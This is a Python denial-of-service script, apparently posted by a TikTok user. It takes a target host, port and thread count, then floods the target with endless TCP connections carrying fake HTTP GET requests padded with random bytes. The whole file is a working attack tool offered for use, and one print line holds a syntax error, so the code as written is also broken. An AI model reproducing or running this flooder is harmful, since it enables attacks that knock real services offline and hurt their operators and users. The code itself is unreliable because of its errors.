import socket
import time
import os
import random
from threading import Thread

os.system("clear")

if not __name__ == "__main__":
    exit()
      
def getport():
    try:
        TARGET_PORT = int(input("Port:\r\n"))
        return TARGET_PORT
    except ValueError:
        print("Port must be a number, Port was set to default " + "80")
        return 80

host = input("Host:\r\n")
port = getport()
speedPerRun = int(input("Hits Per Run:\r\n"))
threads = int(input("Threads:\r\n"))

ip = socket.gethostbyname(host)

bytesToSend = random._urandom(2450)

print("MADE BY apexvr_ ON TIKTOK")

i = 0;

class Count:
    packetCounter = 0 

def DoS():
    try:
        while True:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                dosSocket.connect((ip, port))
                for i in range(speedPerRun):
                    try:
                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                        print("---🚀 PACKET " + str(" SENT AT: " + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) "🚀---")
                        Count.packetCounter = Count.packetCounter + 1
                    except socket.error:
                        print("[!] Error, Maybe host is down.")
                    except KeyboardInterrupt:
                        print("\r\n[!] Ended (Keyboard interupt)")
            except socket.error:
                print("[!] Error, Maybe the host is down.")
            except KeyboardInterrupt:
                print("\r\n[!] Ended (Keyboard interupt)")
            dosSocket.close()
    except KeyboardInterrupt:
        print("\r\n[!] Ended (Keyboard interupt)")
try:
        
    print("Loading.")
    time.sleep(1)
    print("Loading..")
    time.sleep(1)
    print("Loading...")
    time.sleep(1)
    print("Loading.")
    time.sleep(1)
    print("Loading..")
    time.sleep(1)
    print("Loading...")
    
    for i in range(threads):
        try:
            t = Thread(target=DoS)
            t.start()
        except KeyboardInterrupt:
            print("\r\n[!] Ended (Keyboard interupt)")    
except KeyboardInterrupt:
    print("\r\n[!] Ended (Keyboard interupt)")
